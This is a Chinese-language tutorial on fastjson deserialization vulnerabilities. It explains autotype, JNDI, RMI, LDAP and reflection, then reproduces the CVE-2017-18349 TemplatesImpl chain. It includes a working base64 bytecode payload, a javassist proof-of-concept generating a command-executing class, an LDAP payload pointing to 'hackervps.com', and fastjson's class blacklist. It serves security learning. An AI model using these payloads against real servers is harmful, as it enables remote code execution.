{&quot;name&quot;, &quot;age&quot;}) public static class Person { private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } }} 我们通过@JSONType(orders = {&quot;name&quot;, &quot;age&quot;})来指定属性的序列化顺序，这样就是name在前，age在后了。 2. @type是什么东西？如何反序列化带@type的json字符串？ 参考：https://www.cnblogs.com/nice0e3/p/14601670.html 我们在网上看到了很多讲fastjson反序列化漏洞的文章，里面都提到了@type，那么它到底是什么呢？@type是fastjson中的一个特殊注解，用于标识JSON字符串中的某个属性是一个Java对象的类型。具体来说，当fastjson从JSON字符串反序列化为Java对象时，如果JSON字符串中包含@type属性，fastjson会根据该属性的值来确定反序列化后的Java对象的类型。请看以下代码： 12345678910111213package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;import java.io.IOException;public class Main { public static void main(String[] args) throws IOException { String json = &quot;{\\&quot;@type\\&quot;:\\&quot;java.lang.Runtime\\&quot;,\\&quot;@type\\&quot;:\\&quot;java.lang.Runtime\\&quot;,\\&quot;@type\\&quot;:\\&quot;java.lang.Runtime\\&quot;}&quot;; ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;); Runtime runtime = (Runtime) JSON.parseObject(json, Object.class); runtime.exec(&quot;calc.exe&quot;); }} 可以看到直接弹窗了：由于fastjson在1.2.24之后默认禁用@type，因此这里我们通过ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);来开启，否则会报错autoType is not support。我们再看这样的一个demo：首先是类的定义，例如我们的Person.java： 12345678910111213141516171819202122232425262728293031323334353637package org.example;public class Person { private String name; private int age; public Person() {} @Override public String toString() { return &quot;Person{&quot; + &quot;name='&quot; + name + '\\'' + &quot;, age=&quot; + age + '}'; } public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }} 然后是Main.java： 1234567891011121314package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class Main { public static void main(String[] args) { Person user = new Person(); user.setAge(18); user.setName(&quot;xiaoming&quot;); String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(s1); }} 输出结果为：在和前面代码做对比后，可以发现其实就是在调用toJSONString方法的时候，参数里面多了一个SerializerFeature.WriteClassName方法。传入SerializerFeature.WriteClassName可以使得Fastjson支持自省，开启自省后序列化成JSON的数据就会多一个@type，这个是代表对象类型的JSON文本。FastJson的漏洞就是他的这一个功能去产生的，在对该JSON数据进行反序列化的时候，会去调用指定类中对于的get/set/is方法， 后面会详细分析。然后我们就可以通过以下三种方式来反序列化json字符串了： 1234567891011121314151617181920212223// 方法一（返回JSONObject对象）：Person user = new Person();user.setAge(18);user.setName(&quot;xiaoming&quot;);String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);JSONObject jsonObject = JSON.parse(s1);System.out.println(jsonObject);// 方法二：Person user = new Person();user.setAge(18);user.setName(&quot;xiaoming&quot;);String s = JSON.toJSONString(user);Person user1 = JSON.parseObject(s, Person.class);System.out.println(user1);// 方法三：Person user = new Person();user.setAge(18);user.setName(&quot;xiaoming&quot;);String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);Person user1 = JSON.parseObject(s1,Person.class);System.out.println(user1); 执行结果都是一样的： 1Person{name='xiaoming', age=18} 3. JNDI是什么东西？JNDI是Java平台的一种API，它提供了访问各种命名和目录服务的统一方式。JNDI通常用于在JavaEE应用程序中查找和访问资源，如JDBC数据源、JMS连接工厂和队列等。光这么说还是太抽象了，直接上例子。如果我们想要搭建一个jndi的环境，我们需要这么做：首先需要说明的是我Java版本是17，如果不是的话需要安装配置，不然后面的可能会报错，百度谷歌都没用的那种。 （1）整一个tomcat容器，并在容器中配置数据源打开[https://tomcat.apache.org/](https://tomcat.apache.org/)，然后点击Download：这里直接选择下载64位Windows的压缩包：下载链接：https://dlcdn.apache.org/tomcat/tomcat-11/v11.0.0-M4/bin/apache-tomcat-11.0.0-M4-windows-x64.zip解压之后，可以给改一个简洁一点的名字，例如tomcat，然后把bin目录放到环境变量中，如下图：然后再新建一个名为CATALINA_HOME的路径，值为tomcat的根目录，例如我的：除此之外，没有配置JAVA_HOME和JRE_HOME的也要在用户变量中配置一下，需要注意的是，我这里貌似需要安装并配置Java17，否则一直闪退无法启动：双击tomcat的bin目录下的startup.bat，然后访问[http://localhost:8080/](http://localhost:8080/)，就可以看到服务启动成功了：然后配置tomcat目录下的context.xml（tomcat7及以前则是配置server.xml）： 1234&lt;Resource name=&quot;jdbc/security&quot; auth=&quot;Container&quot; type=&quot;javax.sql.DataSource&quot; maxTotal=&quot;100&quot; maxIdle=&quot;30&quot; maxWaitMillis=&quot;10000&quot; username=&quot;root&quot; password=&quot;123456&quot; driverClassName=&quot;com.mysql.jdbc.Driver&quot; url=&quot;jdbc:mysql://localhost:3306/security&quot;/&gt; 可以根据自己本地开启的mysql的实际情况来改，我这里是使用phpstudy来安装开启mysql的：然后继续配置tomcat的conf目录下的web.xml： 123456&lt;resource-ref&gt; &lt;description&gt;Test DB Connection&lt;/description&gt; &lt;res-ref-name&gt;jdbc/root&lt;/res-ref-name&gt; &lt;res-type&gt;javax.sql.DataSource&lt;/res-type&gt; &lt;res-auth&gt;Container&lt;/res-auth&gt;&lt;/resource-ref&gt; （2）去IDEA里面配置web首先先新建一个项目，我命名为jndi_demo：接着配置tomcat：这里我选择了8089端口，因为我8080端口之前被我占用了：然后：然后填写代码运行配置： （3）跑jndi的demo代码，感受jndi的用处然后贴上如下代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package org.example;import jakarta.servlet.ServletException;import jakarta.servlet.annotation.WebServlet;import jakarta.servlet.http.HttpServlet;import jakarta.servlet.http.HttpServletRequest;import jakarta.servlet.http.HttpServletResponse;import javax.naming.Context;import javax.naming.InitialContext;import javax.sql.DataSource;import java.io.IOException;import java.sql.Connection;import java.sql.ResultSet;import java.sql.Statement;@WebServlet(&quot;/test&quot;)public class Test extends HttpServlet { @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { try { // 获取JNDI上下文 Context ctx = new InitialContext(); // 查找数据源 Context envContext = (Context) ctx.lookup(&quot;java:/comp/env&quot;); DataSource ds = (DataSource) envContext.lookup(&quot;jdbc/security&quot;); // 获取连接 Connection conn = ds.getConnection(); System.out.println(&quot;[+] success!&quot;); // 执行查询 Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(&quot;select * from security.emails;&quot;); // 处理结果集 while (rs.next()) { System.out.println(rs.getString(&quot;email_id&quot;)); } // 关闭连接 rs.close(); stmt.close(); conn.close(); } catch (Exception e) { e.printStackTrace(); } }} 成功跑起来了：然后访问[http://localhost:6063/test](http://localhost:6063/test)：没有出现404，说明WebServlet拦截成功，回到idea，发现查询成功： 4. RMI是什么东西？（1）通过一个demo快速认识rmi是如何调用的RMI指的是远程方法调用（Remote Method Invocation），是Java平台提供的一种机制，可以实现在不同Java虚拟机之间进行方法调用。这么说是真抽象，我们直接看下面使用了RMI的demo代码，包括一个服务器端和一个客户端。这个demo实现了一个简单的计算器程序，客户端通过RMI调用服务器端的方法进行加、减、乘、除四则运算。首先是一个计算器接口： 1234567891011121314package org.example;import java.rmi.Remote;import java.rmi.RemoteException;public interface Calculator extends Remote { public int add(int a, int b) throws RemoteException; public int subtract(int a, int b) throws RemoteException; public int multiply(int a, int b) throws RemoteException; public int divide(int a, int b) throws RemoteException;} 然后是客户端代码： 1234567891011121314151617181920212223242526package org.example;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Client { private Client() {} public static void main(String[] args) { try { // Get the registry Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1060); // Lookup the remote object &quot;Calculator&quot; Calculator calc = (Calculator) registry.lookup(&quot;Calculator&quot;); // Call the remote method int result = calc.add(5, 7); // Print the result System.out.println(&quot;Result: &quot; + result); } catch (Exception e) { System.err.println(&quot;Client exception: &quot; + e.toString()); e.printStackTrace(); } }} 接着是服务端代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243package org.example;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class Server extends UnicastRemoteObject implements Calculator { public Server() throws RemoteException {} @Override public int add(int x, int y) throws RemoteException { return x + y; } @Override public int subtract(int a, int b) throws RemoteException { return 0; } @Override public int multiply(int a, int b) throws RemoteException { return 0; } @Override public int divide(int a, int b) throws RemoteException { return 0; } public static void main(String args[]) { try { Server obj = new Server(); LocateRegistry.createRegistry(1060); Registry registry = LocateRegistry.getRegistry(1060); registry.bind(&quot;Calculator&quot;, obj); System.out.println(&quot;Server ready&quot;); } catch (Exception e) { System.err.println(&quot;Server exception: &quot; + e.toString()); e.printStackTrace(); } }} 然后开始跑程序，不需要做任何配置。先把服务端跑起来：然后客户端这里就可以直接运行5+7的结果了： （2）深入理解rmi建议直接看素十八师傅的博客以及天下大木头的微信公众号文章，写的真的是太好了，都是适合细细品味的文章。 https://su18.org/post/rmi-attack/https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA 5. ldap是什么？LDAP是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。在Java安全中，LDAP通常用于集成应用程序与企业目录服务（例如Microsoft Active Directory或OpenLDAP）的认证和授权功能。使用Java的LDAP API，我们可以编写LDAP客户端来执行各种LDAP操作，如绑定（bind）到LDAP服务器、搜索目录、添加、修改和删除目录条目等。Java LDAP API支持使用简单绑定（simple bind）或Kerberos身份验证（Kerberos authentication）进行LDAP身份验证。Java应用程序可以使用LDAP来实现单点登录和跨域身份验证，并与其他应用程序和服务共享身份验证信息。LDAP还可以用于管理用户、组和权限，以及存储和管理应用程序配置信息等。总结：Java中的LDAP是一种使用Java编写LDAP客户端来集成企业目录服务的技术，可以提供安全的身份验证和授权功能，以及方便的用户和配置管理。这么说还是太抽象了，我们还是看一个demo来快速熟悉一下吧。 （1）安装并配置ldap服务器这里我们选择OpenLDAP来进行安装。官网只提供了Linux版本，我们可以去德国公司maxcrc的官网上面去下载openldap for windows： https://www.maxcrc.de/en/download-en/ 这里我们选择64位的，懒人链接：https://www.maxcrc.de/wp-content/uploads/2020/04/OpenLDAPforWindows_x64.zip然后参考这篇文章进行安装： https://blog.csdn.net/oscar999/article/details/108654461 成功启动ldap服务：顺便一提，在Windows上可以使用LDAP Browser来快速浏览查看查询，官网及下载地址如下： https://ldapbrowserwindows.com/https://ldapclient.com/downloads610/LdapBrowser-6.10.x-win-x86-Setup.msi 啪的一下就连接上了，快啊，很快啊： （2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用假设有一个名为”example.com“的公司，需要存储和管理员工信息。他们使用LDAP作为员工信息的目录服务，每个员工都在LDAP中有一个唯一的标识符（DN）。这里我们举两个员工例子： 12345678910111213DN: uid=john,ou=People,dc=example,dc=comcn: John Doesn: DoegivenName: Johnuid: johnuserPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=DN: uid=alice,ou=People,dc=example,dc=comcn: Alice Smithsn: SmithgivenName: Aliceuid: aliceuserPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g= 在LDAP中，DN是一个唯一的标识符，它类似于文件系统中的路径。每个DN由多个RDN（相对区分名称）组成，例如： 1uid=john,ou=People,dc=example,dc=com 这个DN由三个RDN组成：uid=john、ou=People、dc=example,dc=com。可以使用如下LDAP查询语句来检索员工信息，例如：(&amp;(objectClass=person)(uid=john))这个查询语句表示查找所有objectClass为person，且uid为john的员工信息。在LDAP中，查询语句使用LDAP搜索过滤器（LDAP Search Filter）进行筛选。在Fastjson漏洞中，攻击者可以通过构造特定的LDAP查询语句，来执行任意代码或获取敏感信息。例如，以下JSON字符串包含一个恶意构造的LDAP URL： 1{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;ldap://hackervps.com/exp&quot;} 当Fastjson解析该JSON字符串时，会触发LDAP查询操作，查询hackervps.com上的LDAP服务，并执行名为“exp”的操作。这就是Fastjson漏洞的成因之一。 6. java反射是什么？参考： https://www.javasec.org/javase/Reflection/Reflection.html （1）通过demo快速理解反射如果我们不用反射的话，我们写的代码会是下面这样：Person.java： 123456789101112131415161718192021222324252627package org.example;public class Person { private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } public void sayHello() { System.out.println(&quot;Hello, my name is &quot; + name + &quot;, I'm &quot; + age + &quot; years old.&quot;); } public void setAge(int age) { this.age = age; } @Override public String toString() { return &quot;Person{&quot; + &quot;name='&quot; + name + '\\'' + &quot;, age=&quot; + age + '}'; }} Main.java： 1234567891011121314151617package org.example;public class Main { public static void main(String[] args) { // 创建Person对象 Person person = new Person(&quot;张三&quot;, 20); // 调用Person对象的sayHello方法 person.sayHello(); // 修改Person对象的age属性 person.setAge(30); // 输出修改后的Person对象信息 System.out.println(person); }} 运行结果如下：可以看到，我们一开始设置人的名字为张三，年龄为20，然后我们通过setAge方法来修改Person的Age属性，把年龄改成30。但是这么写是有问题的，因为我们不可能总是在编译之前就已经确定好我们要具体改什么值了，我们更希望这个值可以动态变化，所以需要用到Java反射技术。我们可以修改上面的Main.py为如下内容： 12345678910111213141516171819202122232425262728package org.example;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;public class Main { public static void main(String[] args) throws Exception { // 获取Person类的Class对象 Class&lt;?&gt; clazz = Class.forName(&quot;org.example.Person&quot;); // 创建Person对象 Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, int.class); Object person = constructor.newInstance(&quot;张三&quot;, 20); // 调用Person对象的sayHello方法 Method method = clazz.getMethod(&quot;sayHello&quot;); method.invoke(person); // 修改Person对象的age属性 Field field = clazz.getDeclaredField(&quot;age&quot;); field.setAccessible(true); field.set(person, 30); // 输出修改后的Person对象信息 System.out.println(person); }} 这样我们就可以来动态创建对象、调用方法以及修改属性等。 问题：我还是觉得你给出的例子体现不出灵活，怎么办？不急，我们来看这么个例子：假设我们有一个配置文件，里面记录了类的名称、方法名、属性名等信息，我们可以在运行时读取配置文件，然后使用Java反射机制来创建对象、调用方法、修改属性等。这样就可以实现在不修改代码的情况下，根据配置文件来动态地创建对象、调用方法、修改属性，这样不就是很灵活很方便了么？我们来尝试用代码实现下。先建立一个配置文件，比如叫做config.properties，填写如下信息： 12345class=org.example.Personmethod=sayHellofield=agevalue=30name=W01fh4cker 然后修改Main.java： 12345678910111213141516171819202122232425262728293031323334353637383940414243package org.example;import java.io.FileInputStream;import java.util.Properties;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;public class Main { public static void main(String[] args) throws Exception { // 读取配置文件 Properties props = new Properties(); props.load(new FileInputStream(&quot;config.properties&quot;)); // 获取类的名称、方法名、属性名、属性值、姓名 String className = props.getProperty(&quot;class&quot;); String methodName = props.getProperty(&quot;method&quot;); String fieldName = props.getProperty(&quot;field&quot;); String fieldValue = props.getProperty(&quot;value&quot;); String name = props.getProperty(&quot;name&quot;); // 获取类的Class对象 Class&lt;?&gt; clazz = Class.forName(className); // 获取类的有参构造方法 Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, int.class); // 创建类的对象 Object obj = constructor.newInstance(name, 0); // 调用方法 Method method = clazz.getMethod(methodName); method.invoke(obj); // 修改属性 Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, Integer.parseInt(fieldValue)); // 输出修改后的对象信息 System.out.println(obj); }} 运行结果为： （2）【关键！】和漏洞之间的联系？前面讲了这么多关于反射的内容，可能很多初学者和我现在一样，处于一脸懵逼的状态，为什么要用到反射，而不是直接调用java.lang.runtime来执行命令？例如我们平时经常这么玩： 123456789package org.example;import org.apache.commons.io.IOUtils;public class Main { public static void main(String[] args) throws Exception { System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;calc.exe&quot;).getInputStream(), &quot;UTF-8&quot;)); }} 要运行上述代码，需要在maven中引入如下依赖： 12345&lt;dependency&gt; &lt;groupId&gt;commons-io&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;2.11.0&lt;/version&gt;&lt;/dependency&gt; 需要注意的是，要在上述依赖的上线加入&lt;dependencies&gt;&lt;/dependencies&gt;，如下图，然后点击如下图标来自动安装依赖：然后运行程序，就会弹出计算器了：这么做不就是可以执行命令了吗，为什么还要搞反射呢？原来，**Java**安全机制会对代码的执行进行限制，例如限制代码的访问权限、限制代码的资源使用等。如果代码需要执行一些危险的操作，例如执行系统命令，就需要获取**Java**的安全权限。获取**Java**的安全权限需要经过一系列的安全检查，例如检查代码的来源、检查代码的签名等。如果代码没有通过这些安全检查，就无法获取**Java**的安全权限，从而无法执行危险的操作。然而，反射机制可以绕过**Java**安全机制的限制，比如可以访问和修改类的私有属性和方法，可以调用类的私有构造方法，可以创建和访问动态代理对象等。这些操作都是**Java**安全机制所禁止的，但是反射机制可以绕过这些限制，从而执行危险的操作。原来如此！好了，现在来学习如何使用反射调用java.lang.runtime来执行命令，由于Java9之后，模块化系统被引入，模块化系统会限制反射的使用，从而提高Java应用程序的安全性，因此我们要区分版本来学习！为了方便演示，我重新建立了一个项目，并使用Java8。我们先看如下代码： 123456789101112131415161718192021// Java version: 8package org.example;import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.reflect.Method;public class Main { public static void main(String[] args) throws Exception { Class&lt;?&gt; runtimeClass = Class.forName(&quot;java.lang.Runtime&quot;); Method execMethod = runtimeClass.getMethod(&quot;exec&quot;, String.class); Process process = (Process) execMethod.invoke(Runtime.getRuntime(), &quot;calc.exe&quot;); InputStream in = process.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(in)); String line; while ((line = reader.readLine()) != null) { System.out.println(line); } }} 成功执行：然后再看在Java17下的执行反射的代码： 123456789101112131415161718192021222324// // Java version: 17package org.example;import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.invoke.MethodHandle;import java.lang.invoke.MethodHandles;import java.lang.invoke.MethodType;public class Main { public static void main(String[] args) throws Throwable { // 获取Runtime类对象 Class&lt;?&gt; runtimeClass = Class.forName(&quot;java.lang.Runtime&quot;); MethodHandle execMethod = MethodHandles.lookup().findVirtual(runtimeClass, &quot;exec&quot;, MethodType.methodType(Process.class, String.class)); Process process = (Process) execMethod.invokeExact(Runtime.getRuntime(), &quot;calc.exe&quot;); InputStream in = process.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(in)); String line; while ((line = reader.readLine()) != null) { System.out.println(line); } }} 执行结果： 二、漏洞学习1. fastjson&lt;=1.2.24 反序列化漏洞（CVE-2017-18349）（学习TemplatesImpl链的相关知识）（1）漏洞简单复现我们看以下案例：首先创建一个maven项目、导入Fastjson1.2.23并自动下载相关依赖（怎么自动下载的见上文配图）：然后写入如下代码至Main.java（此时已经不需要Person.java了）： 12345678910111213package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;public class Main { public static void main(String[] args) { ParserConfig config = new ParserConfig(); String text = &quot;{\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\\&quot;],'_name':'a.b','_tfactory':{ },\\&quot;_outputProperties\\&quot;:{ }}&quot;; Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField); }} 运行之后直接弹出计算器： （2）漏洞成因分析上面的text里面的_bytecodes的内容是以下内容编译成字节码文件后（.class）再base64编码后的结果： 1234567891011121314151617181920212223242526import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(&quot;calc&quot;); } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) { } @Override public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException { } public static void main(String[] args) throws Exception { Test t = new Test(); }} 可以看到，我们通过以上代码直接定义类Test，并在类的构造方法中执行calc的命令；至于为什么要写上述代码的第14-21行，因为Test类是继承AbstractTranslet的，上述代码的两个transform方法都是实现AbstractTranslet接口的抽象方法，因此都是需要的；具体来说的话，第一个transform带有SerializationHandler参数，是为了把XML文档转换为另一种格式，第二个transform带有DTMAxisIterator参数，是为了对XML文档中的节点进行迭代。总结：对于上述代码，应该这么理解：建立Test类，并让其继承AbstractTranslet类，然后通过Test t = new Test();来初始化，这样我就是假装要把xml文档转换为另一种格式，在此过程中会触发构造方法，而我在构造方法中的代码就是执行calc，所以会弹出计算器。 ①问题1：为什么要继承AbstractTranslet类？参考Y4tacker师傅的文章： https://blog.csdn.net/solitudi/article/details/119082164 但是在实战场景中，Java的ClassLoader类提供了defineClass()方法，可以把字节数组转换成Java类的示例，但是这里面的方法的作用域是被Protected修饰的，也就是说这个方法只能在ClassLoader类中访问，不能被其他包中的类访问：但是，在TransletClassLoader类中，defineClass调用了ClassLoader里面的defineClass方法：然后追踪TransletClassLoader，发现是defineTransletClasses：再往上，发现是getTransletInstance：到此为止，要么是Private修饰要么就是Protected修饰，再往上继续追踪，发现是newTransformer，可以看到此时已经是public了：因此，我们的利用链是： 1TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass() 基于此，我们可以写出如下POC： 123456789101112131415161718192021222324252627282930313233343536373839404142434445package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import java.util.Base64;public class Main { public static class test{ } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.get(test.class.getName()); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = &quot;W01fh4cker&quot; + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass((pool.get(AbstractTranslet.class.getName()))); try { byte[] evilCode = cc.toBytecode(); String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode); final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;; String text1 = &quot;{&quot;+ &quot;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS +&quot;\\&quot;,&quot;+ &quot;\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+evilCode_base64+&quot;\\&quot;],&quot;+ &quot;'_name':'W01h4cker',&quot;+ &quot;'_tfactory':{ },&quot;+ &quot;'_outputProperties':{ }&quot;+ &quot;}\\n&quot;; ParserConfig config = new ParserConfig(); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); } catch (Exception e) { e.printStackTrace(); } }} 这段代码就可以动态生成恶意类，执行效果如下： ②为什么要这么构造json？可以看到，我们最终构造的json数据为： 1234567{ &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;: [&quot;yv66vgAAADQA...CJAAk=&quot;], &quot;_name&quot;: &quot;W01fh4cker&quot;, &quot;_tfactory&quot;: {}, &quot;_outputProperties&quot;: {},} 为什么这么构造呢？还是直接看defineTransletClasses这里：可以看到，逻辑是这样的：先判断_bytecodes是否为空，如果不为空，则执行后续的代码；后续的代码中，会调用到自定义的ClassLoader去加载_bytecodes中的byte[]，并对类的父类进行判断，如果是ABSTRACT_TRANSLET也就是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，那么就把类成员属性的_transletIndex设置成当前循环中的标记位，第一次调用的话，就是class[0]。可以看到，这里的_bytecodes和_outputProperties都是类成员变量。同时，_outputProperties有自己的getter方法，也就是getOutputProperties。总结：说详细一点，**TemplatesImpl**利用链的整体思路如下：构造一个**TemplatesImpl**类的反序列化字符串，其中**_bytecodes**是我们构造的恶意类的类字节码，这个类的父类是**AbstractTranslet**，最终这个类会被加载并使用**newInstance()**实例化。在反序列化过程中，由于**getter**方法**getOutputProperties()**满足条件，将会被**fastjson**调用，而这个方法触发了整个漏洞利用流程：**getOutputProperties()**** -&gt; **newTransformer()** -&gt; **getTransletInstance()** -&gt; **defineTransletClasses()** / ****EvilClass.newInstance()**。限制条件也很明显：需要代码中加了Feature.SupportNonPublicField。 2. fastjson 1.2.25 反序列化漏洞（学习JdbcRowSetImpl链的相关知识）（1）黑白名单机制介绍众所周知，在fastjson自爆1.2.24版本的反序列化漏洞后，1.2.25版本就加入了黑白名单机制。例如我们更换并下载1.2.25版本的fastjson，然后再去执行原来的poc：就会提示我们autoType is not support：查看源码可以发现这里定义了反序列化类的黑名单：具体如下： 12345678910111213141516171819202122bshcom.mchangecom.sun.java.lang.Threadjava.net.Socketjava.rmijavax.xmlorg.apache.bcelorg.apache.commons.beanutilsorg.apache.commons.collections.Transformerorg.apache.commons.collections.functorsorg.apache.commons.collections4.comparatorsorg.apache.commons.fileuploadorg.apache.myfaces.context.servletorg.apache.tomcatorg.apache.wicket.utilorg.codehaus.groovy.runtimeorg.hibernateorg.jbossorg.mozilla.javascriptorg.python.coreorg.springframework 